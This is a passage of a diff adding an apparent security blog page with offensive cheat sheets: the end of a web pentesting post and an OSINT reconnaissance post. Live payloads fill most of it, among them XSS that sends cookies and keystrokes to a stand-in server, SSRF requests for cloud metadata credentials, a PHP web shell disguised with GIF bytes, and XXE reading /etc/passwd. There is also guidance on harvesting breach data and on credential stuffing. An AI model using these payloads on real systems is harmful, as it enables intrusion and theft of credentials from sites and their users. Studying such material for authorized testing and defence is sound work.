+# Stealing cookies — send to your server
+&lt;script&gt;fetch('https://your-server.com/steal?cookie='+document.cookie)&lt;/script&gt;
+
+# Keylogger via XSS
+&lt;script&gt;document.onkeypress=function(e){fetch('https://your-server.com/log?key='+e.key)}&lt;/script&gt;
+
+# DOM-based XSS — look for sinks
+# document.write, innerHTML, eval, setTimeout, location.href</code></pre>
+
+                    <h2 id="web-ssrf">Server-Side Request Forgery (SSRF)</h2>
+                    <p>
+                        SSRF makes the server send requests on your behalf. If the app fetches a URL you control, you can make it hit internal services, cloud metadata endpoints, or the admin panel that only allows localhost.
+                    </p>
+                    <pre><code># Basic SSRF test
+?url=http://127.0.0.1:22
+?url=http://127.0.0.1:80
+?url=http://127.0.0.1:3306
+?url=http://127.0.0.1:8080
+
+# Cloud metadata endpoints
+?url=http://169.254.169.254/latest/meta-data/
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+
+# Bypass filters
+?url=http://0177.0.0.1  (octal)
+?url=http://2130706433  (decimal)
+?url=http://0x7f000001  (hex)
+?url=http://127.1
+?url=http://127.0.0.1.nip.io
+?url=http://127.0.0.1.xip.io
+
+# DNS rebinding
+?url=http://your-domain.com
+# Your domain resolves to attacker IP first, then 127.0.0.1 on second request
+
+# Gopher protocol to attack internal services
+?url=gopher://127.0.0.1:3306/_%0a%00%00%01%85%a6%ff%01%00... (MySQL payload)</code></pre>
+
+                    <h2 id="web-idor">Insecure Direct Object Reference (IDOR)</h2>
+                    <p>
+                        IDOR is when you can access other users' data by changing an identifier. Change <code>id=123</code> to <code>id=124</code> and suddenly you're viewing someone else's invoice. It's the simplest bug and the most embarrassing to explain to a client.
+                    </p>
+                    <pre><code># Test every numeric parameter
+?id=123 → ?id=124
+?order_id=456 → ?order_id=457
+?user_id=789 → ?user_id=790
+?file_id=1 → ?file_id=2
+
+# Test predictable UUIDs
+?uuid=550e8400-e29b-41d4-a716-446655440000
+# Try incrementing, decrementing, or guessing patterns
+
+# Test with different HTTP methods
+GET /api/orders/123 → 200 (your order)
+GET /api/orders/124 → 403 (not yours)
+DELETE /api/orders/124 → 200 (oops)
+PUT /api/orders/124 → 200 (oops again)
+
+# Mass assignment — send extra fields
+POST /api/users/123
+{"name":"new name","role":"admin","is_admin":true}
+
+# Parameter pollution
+?id=123&id=124
+# Backend might process the second parameter</code></pre>
+
+                    <h2 id="web-jwt">JWT Attacks</h2>
+                    <p>
+                        JSON Web Tokens are just base64-encoded claims with a signature. If the app doesn't verify properly, you can modify the payload and forge admin access. If the secret is weak, you can brute force it.
+                    </p>
+                    <pre><code># Decode JWT
+# Header: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+# Payload: eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9
+# Signature: SflKxwRJSMeKKF2QT4fwpMe...
+
+# Change algorithm to none (unverified)
+# Original header: {"alg":"HS256","typ":"JWT"}
+# New header: {"alg":"none","typ":"JWT"}
+# Remove signature, send token with alg=none
+
+# Change algorithm RS256 to HS256
+# If app uses RS256 (public key) but accepts HS256 (symmetric)
+# Sign the forged token with the public key as HMAC secret
+
+# Brute force weak secret
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
+
+# Use jwt_tool for automation
+python3 jwt_tool.py eyJ0eXAiOiJKV1Qi... -t
+python3 jwt_tool.py eyJ0eXAiOiJKV1Qi... -S -d /usr/share/wordlists/rockyou.txt</code></pre>
+
+                    <h2 id="web-upload">File Upload Bypasses</h2>
+                    <p>
+                        File upload functionality is a direct path to RCE if you can trick the app into executing your payload. The defense is usually extension blacklists and MIME type checks — both are trivial to bypass.
+                    </p>
+                    <pre><code># Double extension
+shell.php.jpg
+shell.php%00.jpg
+shell.php;.jpg
+shell.pHp
+shell.PhP
+
+# Null byte injection (PHP < 5.3.4)
+shell.php%00.jpg
+
+# MIME type bypass
+# Change Content-Type to image/jpeg while uploading PHP
+Content-Type: image/jpeg
+
+# Magic bytes — add GIF header to PHP file
+GIF89a;
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# Path traversal in filename
+../../shell.php
+../shell.php
+..%2f..%2fshell.php
+
+# Apache .htaccess upload
+.htaccess content:
+AddType application/x-httpd-php .jpg
+# Then upload shell.jpg
+
+# IIS short filename
+shell.asp;.jpg
+shell.aspx;.jpg
+
+# XXE in SVG upload
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE svg [
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;svg&gt;&xxe;&lt;/svg&gt;</code></pre>
+
+                    <h2 id="web-methodology">Methodology</h2>
+                    <ol>
+                        <li><strong>Map the application.</strong> Every page, every parameter, every form. Use Burp Suite's site map and spidering.</li>
+                        <li><strong>Identify input vectors.</strong> URL parameters, headers, cookies, POST bodies, file uploads, WebSocket messages.</li>
+                        <li><strong>Fuzz with payloads.</strong> Use Burp Intruder or ffuf with wordlists for XSS, SQLi, LFI, SSTI, and command injection.</li>
+                        <li><strong>Test authentication.</strong> Password reset flows, registration, MFA bypasses, session fixation, JWT weaknesses.</li>
+                        <li><strong>Test authorization.</strong> Horizontal and vertical IDOR, role-based access control, forced browsing.</li>
+                        <li><strong>Test business logic.</strong> Price manipulation, quantity tampering, workflow bypass, race conditions.</li>
+                        <li><strong>Test APIs.</strong> GraphQL introspection, REST mass assignment, SOAP XXE, API rate limiting.</li>
+                        <li><strong>Chain vulnerabilities.</strong> XSS + CSRF to change email, SSRF to hit metadata, SQLi to dump creds, upload to get RCE.</li>
+                    </ol>
+
+                    <blockquote>
+                        "Every web app is just a frontend for a database that someone didn't secure properly. Your job is to find the query they forgot to parameterize."
+                    </blockquote>
+                </div>
+
+                <div class="footer">
+                    <p>Built by <a href="https://hackherway.neocities.org" target="_blank">hackherway</a> // No rights reserved, steal it</p>
+                </div>
+            </main>
+
+            <aside class="sidebar right-sidebar">
+                <div class="sidebar-title">Categories</div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Active Directory</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Enumeration</a></li>
+                        <li class="sidebar-item"><a href="#">Kerberos Attacks</a></li>
+                        <li class="sidebar-item"><a href="#">LDAP & DNS</a></li>
+                        <li class="sidebar-item"><a href="#">Privilege Escalation</a></li>
+                        <li class="sidebar-item"><a href="#">Lateral Movement</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Network Security</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">ARP Spoofing</a></li>
+                        <li class="sidebar-item"><a href="#">DHCP Starvation</a></li>
+                        <li class="sidebar-item"><a href="#">DNS Exfiltration</a></li>
+                        <li class="sidebar-item"><a href="#">Wireless Attacks</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Offensive Tools</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">BloodHound</a></li>
+                        <li class="sidebar-item"><a href="#">Impacket</a></li>
+                        <li class="sidebar-item"><a href="#">CrackMapExec</a></li>
+                        <li class="sidebar-item"><a href="#">Responder</a></li>
+                        <li class="sidebar-item"><a href="#">Mimikatz</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Methodology</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Reconnaissance</a></li>
+                        <li class="sidebar-item"><a href="#">Threat Hunting</a></li>
+                        <li class="sidebar-item"><a href="#">Red Team Ops</a></li>
+                        <li class="sidebar-item"><a href="#">Purple Teaming</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <!-- ========== BLOG POST: OSINT ========== -->
+    <div id="page-osint" class="page hidden">
+        <div class="container blog-layout">
+            <aside class="sidebar toc-sidebar">
+                <div class="sidebar-title">On This Page</div>
+                <ul class="sidebar-items" style="border-left: none; padding-left: 0;">
+                    <li class="sidebar-item"><a href="#osint-intro" class="toc-link" onclick="scrollToSection('osint-intro')">Introduction</a></li>
+                    <li class="sidebar-item"><a href="#osint-domain" class="toc-link" onclick="scrollToSection('osint-domain')">Domain & Subdomain</a></li>
+                    <li class="sidebar-item"><a href="#osint-email" class="toc-link" onclick="scrollToSection('osint-email')">Email Harvesting</a></li>
+                    <li class="sidebar-item"><a href="#osint-breach" class="toc-link" onclick="scrollToSection('osint-breach')">Breach Data</a></li>
+                    <li class="sidebar-item"><a href="#osint-social" class="toc-link" onclick="scrollToSection('osint-social')">Social Media</a></li>
+                    <li class="sidebar-item"><a href="#osint-tech" class="toc-link" onclick="scrollToSection('osint-tech')">Technology Stack</a></li>
+                    <li class="sidebar-item"><a href="#osint-github" class="toc-link" onclick="scrollToSection('osint-github')">GitHub Recon</a></li>
+                    <li class="sidebar-item"><a href="#osint-cloud" class="toc-link" onclick="scrollToSection('osint-cloud')">Cloud Assets</a></li>
+                    <li class="sidebar-item"><a href="#osint-checklist" class="toc-link" onclick="scrollToSection('osint-checklist')">Quick Checklist</a></li>
+                </ul>
+            </aside>
+
+            <main class="main blog-post">
+                <article class="blog-header">
+                    <div class="blog-tags">
+                        <span class="blog-tag">OSINT</span>
+                        <span class="blog-tag">Reconnaissance</span>
+                        <span class="blog-tag">Cheatsheet</span>
+                    </div>
+                    <h1 class="blog-title">OSINT Reconnaissance Cheatsheet</h1>
+                    <div class="blog-meta">
+                        <div class="author">
+                            <div class="author-avatar">H</div>
+                            <span>hackherway</span>
+                        </div>
+                        <span>May 25, 2026</span>
+                        <span>15 min read</span>
+                    </div>
+                </article>
+
+                <div class="blog-content">
+                    <p id="osint-intro">
+                        The best attacks start before you touch a single port. OSINT is about building a complete picture of your target from public sources — domains, people, infrastructure, technology, and the mistakes they've already made. Every breached password, every exposed S3 bucket, every employee's LinkedIn post about their "new project" is intelligence. Here's how to gather it systematically.
+                    </p>
+
+                    <h2 id="osint-domain">Domain & Subdomain Enumeration</h2>
+                    <p>
+                        Your target's attack surface is their DNS records. Subdomains host staging environments, admin panels, APIs, and legacy systems that nobody remembers to patch.
+                    </p>
+                    <pre><code># Passive subdomain enumeration
+subfinder -d target.com -all -o subs.txt
+amass enum -passive -d target.com -o amass.txt
+assetfinder --subs-only target.com
+findomain -t target.com
+
+# Active subdomain enumeration (brute force)
+amass enum -active -d target.com -brute -w /usr/share/wordlists/dns.txt
+gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
+
+# Certificate transparency logs
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
+# Or use certspotter, censys, or certsh
+
+# DNS zone transfer (rare but gold when it works)
+dig axfr @ns1.target.com target.com
+
+# Reverse DNS lookup
+for ip in $(seq 1 254); do dig -x 192.168.1.$ip +short; done
+
+# Find related domains via WHOIS
+whois target.com | grep -i "registrant\|admin\|tech"
+# Use the same registrant email to find other domains they own</code></pre>
+
+                    <h2 id="osint-email">Email Harvesting</h2>
+                    <p>
+                        Emails are usernames, password reset targets, and phishing entry points. The more you collect, the better your social engineering and credential stuffing attacks.
+                    </p>
+                    <pre><code># TheHarvester — classic email/domain harvesting
+theHarvester -d target.com -b all
+# Sources: baidu, bing, bingapi, bufferoverun, censys, crtsh, dnsdumpster,
+#          duckduckgo, google, hackertarget, intelx, linkedin, netcraft,
+#          otx, pentesttools, projectdiscovery, qwant, rapiddns, sublist3r,
+#          threatcrowd, threatminer, urlscan, virustotal, yahoo
+
+# Hunter.io (requires API key)
+curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=YOUR_KEY"
+
+# Phonebook.cz
+curl "https://api.phonebook.cz/phonebook?domain=target.com"
+
+# Skymem
+# skymem.info — search by domain for email addresses
+
+# LinkedIn scraping for corporate emails
+# Use tools like linkedint or manual scraping with Sales Navigator
+# Pattern: firstname.lastname@target.com, flastname@target.com, etc.
+
+# Verify email validity
+# smtp-user-enum, or online tools like verify-email.org</code></pre>
+
+                    <h2 id="osint-breach">Breach Data Analysis</h2>
+                    <p>
+                        Breached credentials are the fastest way in. If your target's employees reuse passwords (they do), a 2017 breach from some random forum is your ticket to their VPN.
+                    </p>
+                    <pre><code># DeHashed (paid, worth every penny)
+curl "https://api.dehashed.com/search?query=email:@target.com" \
+  -H "Accept: application/json" \
+  -u "your@email.com:api_key"
+
+# Have I Been Pwned (API key required)
+curl "https://haveibeenpwned.com/api/v3/breachedaccount/user@target.com" \
+  -H "hibp-api-key: YOUR_KEY"
+
+# Leak-Lookup
+# leak-lookup.com — search by email or domain
+
+# Public breach dumps (use responsibly)
+# Search torrents, forums, and specialized search engines for:
+# target.com, @target.com, known employee emails
+
+# Password analysis from breaches
+# Once you have hashes, use hashcat or john
+# Common patterns: CompanyName2024!, Target123!, Summer2024!
+
+# Credential stuffing
+# Use breached credentials against target's login portals
+# Tools: cme, crackmapexec, or custom scripts with requests</code></pre>
+
+                    <h2 id="osint-social">Social Media Intelligence</h2>
+                    <p>
+                        People are the weakest link, and they advertise their weaknesses on social media. Job postings reveal technology stacks, vacation photos reveal badge designs, and "first day" posts reveal internal systems.
+                    </p>
+                    <pre><code># LinkedIn reconnaissance
+# Search for employees by title: "system administrator", "devops", "security"
+# Look for recent departures — they often still have access
+# Check "About" sections for technology mentions
+
+# Twitter / X reconnaissance
+# Search: site:twitter.com "target.com" OR "@target" "password" OR "vpn" OR "aws"
+# Use advanced search: from:employee_handle "internal tool"
+
+# GitHub reconnaissance (detailed section below)
+# Search for leaked credentials, internal repositories, exposed keys
+
+# Instagram / Facebook
+# Geolocation tagging on office photos
+# Badge designs in "first day" or "team outing" posts
+# Whiteboards with architecture diagrams in background
+
+# Shodan images
+# shodan.io/images — search by organization for exposed webcams, industrial systems
+
+# Wayback Machine
+# web.archive.org — find old versions of the site, exposed files, changed content
+# Use waybackurls to extract all archived URLs
+waybackurls target.com > wayback.txt
+
+# Google Dorks
+site:target.com filetype:pdf "confidential"
+site:target.com filetype:doc "password"
+site:target.com inurl:admin
+site:target.com intitle:"index of" "config"
+site:pastebin.com "target.com"
+site:github.com "target.com" "password" OR "api_key" OR "secret"</code></pre>
+
+                    <h2 id="osint-tech">Technology Stack Fingerprinting</h2>
+                    <p>
+                        Knowing what technologies your target uses tells you exactly what vulnerabilities to look for. A Django app has different weaknesses than a .NET Core API.
+                    </p>
+                    <pre><code># Wappalyzer (browser extension or CLI)
+wappalyzer https://target.com
+
+# BuiltWith
+# builtwith.com — comprehensive technology profile
+
+# WhatWeb
+whatweb https://target.com
+
+# Nmap scripts
+nmap -p80,443 --script http-title,http-enum,http-headers,http-methods target.com
+
+# Shodan
+# shodan.io — search by domain, IP, or organization
+# Find exposed services, versions, and misconfigurations
+
+# Censys
+# censys.io — similar to Shodan, better for certificate data
+
+# Favicon analysis
+# Hash the favicon and search on Shodan/Censys for related assets
+# curl -s https://target.com/favicon.ico | md5sum
+
+# Error pages
+# Trigger 404s and 500s to see stack traces revealing frameworks
+# https://target.com/nonexistent
+# https://target.com/admin'
+
+# API documentation
+# /swagger-ui.html, /api-docs, /v2/api-docs, /openapi.json
+# /graphql, /api/graphql
+# Reveal endpoints, parameters, and authentication schemes</code></pre>
+
+                    <h2 id="osint-github">GitHub Reconnaissance</h2>
+                    <p>
+                        Developers leak everything on GitHub. API keys, database credentials, internal documentation, and hardcoded passwords in commit history. GitHub search is your best friend.
+                    </p>
+                    <pre><code># GitHub dorks
+org:target-org "password"
+org:target-org "api_key"
+org:target-org "secret"
+org:target-org "AWS_ACCESS_KEY_ID"
+org:target-org "private_key"
+org:target-org "jdbc:mysql"
+org:target-org "mongodb://"
+org:target-org "redis://"
+
+# Search in commit history
+git log --all --source --remotes -- '*.env'
+git log --all -p -- '*.json' | grep -i "password\|secret\|key"
+
+# TruffleHog — scan for secrets in repos
+trufflehog git https://github.com/target-org/repo.git
+trufflehog filesystem /path/to/repo
+
+# GitLeaks — similar secret scanner
+gitleaks detect --source /path/to/repo
+
+# GitHub API for enumeration
+curl "https://api.github.com/orgs/target-org/repos?per_page=100"
+curl "https://api.github.com/orgs/target-org/members?per_page=100"
+curl "https://api.github.com/users/employee/repos?per_page=100"
+
+# Gist search
+curl "https://api.github.com/gists/public?per_page=100" | grep target-org
+
+# Commit history analysis
+# Even if secrets are removed, they're in the git history
+# git log -p | grep -i "password\|secret\|token"</code></pre>
+
+                    <h2 id="osint-cloud">Cloud Asset Discovery</h2>
+                    <p>
+                        Cloud misconfigurations are the new open ports. S3 buckets, Azure blobs, GCP storage — they're all publicly accessible if someone clicked the wrong checkbox.
+                    </p>
+                    <pre><code># AWS S3 bucket enumeration
+# Common naming patterns:
+# target.com, target-com, target-backup, target-data, target-dev
+# Use s3scanner or manual enumeration
+
+# S3 bucket brute force
+curl https://target.s3.amazonaws.com
+curl https://s3.amazonaws.com/target
+curl https://s3.amazonaws.com/target-backup
+
+# Grayhat Warfare
+# grayhatwarfare.com — search public S3 buckets by keyword
+
+# Bucket enumeration tools
+s3scanner scan --buckets buckets.txt
+aws s3 ls s3://target-bucket --no-sign-request
+
+# Azure blob storage
+# https://target.blob.core.windows.net/container
+# https://target.queue.core.windows.net/
+
+# GCP storage
+# https://storage.googleapis.com/target-bucket
+
+# Cloudflare enumeration
+# Search for origin IPs bypassing Cloudflare
+# Use censys, shodan, or historical DNS data
+# Once you have the origin IP, attack it directly
+
+# Terraform state files
+# terraform.tfstate often contains plaintext secrets
+# Search: site:target.com filetype:tfstate
+# Or check GitHub for .tfstate files</code></pre>
+
+                    <h2 id="osint-checklist">Quick Checklist</h2>
+                    <ul>
+                        <li><code>subfinder -d target.com -all</code> — subdomain enumeration</li>
+                        <li><code>amass enum -passive -d target.com</code> — comprehensive DNS data</li>
+                        <li><code>theHarvester -d target.com -b all</code> — email and domain harvesting</li>
+                        <li><code>whois target.com</code> — registrant information</li>
+                        <li><code>dig axfr @ns1.target.com target.com</code> — zone transfer attempt</li>
+                        <li>Search breach databases for @target.com emails</li>
+                        <li>Search Have I Been Pwned for key employee emails</li>
+                        <li>LinkedIn reconnaissance for employee roles and technology mentions</li>
+                        <li>Twitter/X search for leaked information or complaints about internal tools</li>
+                        <li>GitHub search for org:target-org with keywords: password, api_key, secret</li>
+                        <li>Shodan search for target IPs and exposed services</li>
+                        <li>Censys search for certificate data and cloud assets</li>
+                        <li>Google dorks for exposed documents, admin panels, and directory listings</li>
+                        <li>Wayback Machine for historical site versions and exposed files</li>
+                        <li>S3 bucket enumeration with common naming patterns</li>
+                        <li>Grayhat Warfare for public cloud storage</li>
+                        <li>Wappalyzer / WhatWeb for technology fingerprinting</li>
+                        <li>TruffleHog / GitLeaks for secret detection in repos</li>
+                        <li>Search Pastebin, GitHub Gists, and forums for leaked credentials</li>
+                    </ul>
+
+                    <blockquote>
+                        "OSINT isn't about finding secrets. It's about finding the people who accidentally published them and the systems that never should have been public."
+                    </blockquote>
+                </div>
+
+                <div class="footer">
+                    <p>Built by <a href="https://hackherway.neocities.org" target="_blank">hackherway</a> // No rights reserved, steal it</p>
+                </div>
+            </main>
+
+            <aside class="sidebar right-sidebar">
+                <div class="sidebar-title">Categories</div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Active Directory</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Enumeration</a></li>
+                        <li class="sidebar-item"><a href="#">Kerberos Attacks</a></li>
+                        <li class="sidebar-item"><a href="#">LDAP & DNS</a></li>
+                        <li class="sidebar-item"><a href="#">Privilege Escalation</a></li>
+                        <li class="sidebar-item"><a href="#">Lateral Movement</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Network Security</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">ARP Spoofing</a></li>
+                        <li class="sidebar-item"><a href="#">DHCP Starvation</a></li>
+                        <li class="sidebar-item"><a href="#">DNS Exfiltration</a></li>
+                        <li class="sidebar-item"><a href="#">Wireless Attacks</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Offensive Tools</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">BloodHound</a></li>
+                        <li class="sidebar-item"><a href="#">Impacket</a></li>
+                        <li class="sidebar-item"><a href="#">CrackMapExec</a></li>
+                        <li class="sidebar-item"><a href="#">Responder</a></li>
+                        <li class="sidebar-item"><a href="#">Mimikatz</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Methodology</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#" class="active">Reconnaissance</a></li>
+                        <li class="sidebar-item"><a href="#">Threat Hunting</a></li>
+                        <li class="sidebar-item"><a href="#">Red Team Ops</a></li>
+                        <li class="sidebar-item"><a href="#">Purple Teaming</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <script>
+        // ========== PAGE SWITCHING ==========
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
+            const target = document.getElementById('page-' + pageId);
+            if (target) {
+                target.classList.remove('hidden');
+                window.scrollTo(0, 0);
+            }
+            document.querySelectorAll('.nav-link[data-page]').forEach(link => {
+                link.classList.toggle('active', link.dataset.page === pageId);
+            });
+        }
+
+        // ========== SIDEBAR TOGGLE ==========
+        function toggleGroup(el) {
+            el.parentElement.classList.toggle('collapsed');
+        }
+
+        // ========== SCROLL TO SECTION ==========
+        function scrollToSection(id) {
+            const el = document.getElementById(id);
+            if (el) {
+                el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+        }
+
+        // ========== MOBILE NAV ==========
+        function toggleMobileNav() {
+            document.getElementById('mobileNavOverlay').classList.toggle('active');
+            document.getElementById('mobileNavDrawer').classList.toggle('active');
+        }
+
+        // ========== PDF DATA ==========
+        const pdfLibrary = [
+            {
+                id: 'pdf-ad-attacks',
+                title: 'Active Directory Attack Matrix',
+                description: 'Comprehensive guide covering AS-REP roasting, Kerberoasting, Golden Tickets, DCSync, delegation abuse, and ACL exploitation.',
+                url: 'pdfs/ad-attack-matrix.pdf',
+                tags: ['Active Directory', 'Kerberos', 'Cheatsheet']
+            },
+            {
+                id: 'pdf-windows-privesc',
+                title: 'Windows Privilege Escalation',
+                description: 'From unquoted service paths to token impersonation — every vector that turns a low-priv shell into SYSTEM.',
+                url: 'pdfs/windows-privesc.pdf',
+                tags: ['Windows', 'Privilege Escalation', 'Cheatsheet']
+            },
+            {
+                id: 'pdf-linux-privesc',
+                title: 'Linux Privilege Escalation',
+                description: 'SUID binaries, sudo misconfigurations, cron jobs, PATH hijacking, capabilities, and container escapes.',
+                url: 'pdfs/linux-privesc.pdf',
+                tags: ['Linux', 'Privilege Escalation', 'Cheatsheet']
+            },
+            {
+                id: 'pdf-network-pivot',
+                title: 'Network Pivoting & Tunneling',
+                description: 'SSH tunnels, Ligolo-ng, Chisel, ProxyChains, ICMP tunneling, and DNS exfiltration techniques.',
+                url: 'pdfs/network-pivoting.pdf',
+                tags: ['Network', 'Pivoting', 'Cheatsheet']
+            },
+            {
+                id: 'pdf-web-pentest',
+                title: 'Web Application Pentesting',
+                description: 'SQL injection, XSS, SSRF, IDOR, JWT attacks, file upload bypasses, and systematic methodology.',
+                url: 'pdfs/web-pentesting.pdf',
+                tags: ['Web', 'Pentesting', 'Cheatsheet']
+            },
+            {
+                id: 'pdf-osint',
+                title: 'OSINT Reconnaissance',
+                description: 'Domain enumeration, email harvesting, breach data analysis, social media intelligence, and cloud asset discovery.',
+                url: 'pdfs/osint-recon.pdf',
+                tags: ['OSINT', 'Reconnaissance', 'Cheatsheet']
+            }
+        ];
+
+        // ========== RENDER PDF CARDS ==========
+        function renderPdfCards() {
+            const grid = document.getElementById('pdfGrid');
+            if (!grid) return;
+
+            grid.innerHTML = pdfLibrary.map(pdf => `
+                <div class="pdf-card" id="${pdf.id}">
+                    <div class="pdf-thumbnail" data-pdf-url="${pdf.url}">
+                        <div class="pdf-placeholder">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                                <polyline points="14 2 14 8 20 8"></polyline>
+                                <line x1="16" y1="13" x2="8" y2="13"></line>
+                                <line x1="16" y1="17" x2="8" y2="17"></line>
+                                <polyline points="10 9 9 9 8 9"></polyline>
+                            </svg>
+                            <span>Loading preview...</span>
+                        </div>
+                    </div>
+                    <div class="pdf-info">
+                        <h3>${pdf.title}</h3>
+                        <p>${pdf.description}</p>
+                    </div>
+                    <div class="pdf-actions">
+                        <a href="${pdf.url}" class="pdf-btn pdf-btn-primary" download>
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                                <polyline points="7 10 12 15 17 10"></polyline>
+                                <line x1="12" y1="15" x2="12" y2="3"></line>
+                            </svg>
+                            Download
+                        </a>
+                        <a href="${pdf.url}" class="pdf-btn pdf-btn-secondary" target="_blank">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                            </svg>
+                            View
+                        </a>
+                    </div>
+                </div>
+            `).join('');
+
+            // Render PDF thumbnails
+            pdfLibrary.forEach(pdf => {
+                renderPdfThumbnail(pdf.url, pdf.id);
+            });
+        }
+
+        // ========== RENDER PDF THUMBNAIL ==========
+        async function renderPdfThumbnail(url, cardId) {
+            const card = document.getElementById(cardId);
+            if (!card) return;
+            const container = card.querySelector('.pdf-thumbnail');
+            if (!container) return;
+
+            try {
+                const loadingTask = pdfjsLib.getDocument(url);
+                const pdf = await loadingTask.promise;
+                const page = await pdf.getPage(1);
+
+                const scale = 1.5;
+                const viewport = page.getViewport({ scale });
+
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                canvas.width = viewport.width;
+                canvas.height = viewport.height;
+
+                await page.render({ canvasContext: context, viewport }).promise;
+
+                container.innerHTML = '';
+                container.appendChild(canvas);
+            } catch (err) {
+                console.warn('Failed to render PDF thumbnail:', url, err);
+                container.innerHTML = `
+                    <div class="pdf-error">
+                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                            <polyline points="14 2 14 8 20 8"></polyline>
+                        </svg>
+                        <span>PDF preview unavailable</span>
+                        <span style="font-size:10px;opacity:0.6">${err.message}</span>
+                    </div>
+                `;
+            }
+        }
+
+        // ========== DECRYPTING TYPEWRITER ==========
+        class DecryptingTypewriter {
+            constructor(element, options = {}) {
+                this.element = element;
+                this.text = options.text || '';
+                this.scrambleChars = options.scrambleChars || 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`';
+                this.speed = options.speed || 25;
+                this.revealDelay = options.revealDelay || 60;
+                this.onComplete = options.onComplete || null;
+                this.chars = [];
+                this.isRunning = false;
+            }
+            randomChar() {
+                return this.scrambleChars[Math.floor(Math.random() * this.scrambleChars.length)];
+            }
+            start(newText) {
+                this.stop();
+                this.text = newText || this.text;
+                this.isRunning = true;
+                this.element.innerHTML = '';
+                this.chars = [];
+                for (let i = 0; i < this.text.length; i++) {
+                    const span = document.createElement('span');
+                    span.className = 'char scrambling';
+                    if (this.text[i] === ' ') {
+                        span.innerHTML = '&nbsp;';
+                    } else {
+                        span.textContent = this.randomChar();
+                    }
+                    this.element.appendChild(span);
+                    this.chars.push({ element: span, target: this.text[i], resolved: false });
+                }
+                const cursor = document.createElement('span');
+                cursor.className = 'cursor';
+                this.element.appendChild(cursor);
+                const scrambleAll = () => {
+                    if (!this.isRunning) return;
+                    this.chars.forEach(char => {
+                        if (!char.resolved && char.target !== ' ') {
+                            char.element.textContent = this.randomChar();
+                        }
+                    });
+                };
+                const scrambleInterval = setInterval(scrambleAll, this.speed);
+                let resolveIndex = 0;
+                const resolveNext = () => {
+                    if (!this.isRunning) { clearInterval(scrambleInterval); return; }
+                    if (resolveIndex < this.chars.length) {
+                        const char = this.chars[resolveIndex];
+                        char.resolved = true;
+                        if (char.target === ' ') {
+                            char.element.innerHTML = '&nbsp;';
+                        } else {
+                            char.element.textContent = char.target;
+                        }
+                        char.element.classList.remove('scrambling');
+                        char.element.classList.add('resolved', 'just-resolved');
+                        setTimeout(() => char.element.classList.remove('just-resolved'), 150);
+                        resolveIndex++;
+                        setTimeout(resolveNext, this.revealDelay + (Math.random() * 30 - 15));
+                    } else {
+                        clearInterval(scrambleInterval);
+                        this.isRunning = false;
+                        if (this.onComplete) this.onComplete();
+                    }
+                };
+                setTimeout(resolveNext, this.speed * 2);
+            }
+            stop() {
+                this.isRunning = false;
+            }
+        }
+
+        // ========== INIT ==========
+        window.addEventListener('DOMContentLoaded', () => {
+            // Render PDF cards
+            renderPdfCards();
+
+            // Start typewriter
